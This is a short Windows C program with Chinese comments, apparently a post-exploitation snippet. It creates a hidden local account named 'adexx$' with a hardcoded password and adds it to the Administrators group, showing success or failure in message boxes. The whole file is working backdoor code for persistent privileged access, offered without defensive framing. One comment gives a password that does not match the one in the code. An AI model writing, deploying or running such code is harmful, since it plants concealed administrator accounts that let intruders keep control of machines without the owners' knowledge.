#ifndef UNICODE    
#define UNICODE    
#endif    
#include<stdio.h>  
#include<windows.h>  
#include<lm.h>  
#pragma comment(lib,"netapi32")
int wmain(int argc, wchar_t *argv[])
{
	// 定义USER_INFO_1结构体
	USER_INFO_1 ui;
	DWORD dwError = 0;
	//小笔记 LPWSTR 是 wchar_t *   ， L"zzzhh" 类型是const wchar_t[6] 可以隐式转换为const whcar_t *
	wchar_t username[] = L"adexx$";
	ui.usri1_name = username;            // 账户   
	wchar_t password[] = L"adexx!@#QWE";
	ui.usri1_password = password;      // 密码
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;
	//添加名为adexx的用户,密码为p@adexx!@#QWE
	if (NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError) == NERR_Success)
	{

		MessageBox(0, L"successfully", L"title", 0);

	}
	else
	{
		//添加失败    
		MessageBox(0, L"fail", L"title", 0);

	}

	// 添加用户到administrators组
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = ui.usri1_name;
	if (NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1) == NERR_Success)
	{
		//添加成功    
		MessageBox(0, L"Add to Administrators success", L"title", 0);
	}
	else
	{
		//添加失败    
		MessageBox(0, L"Add to Administrators Fail!", L"title", 0);
	}

	return 0;
}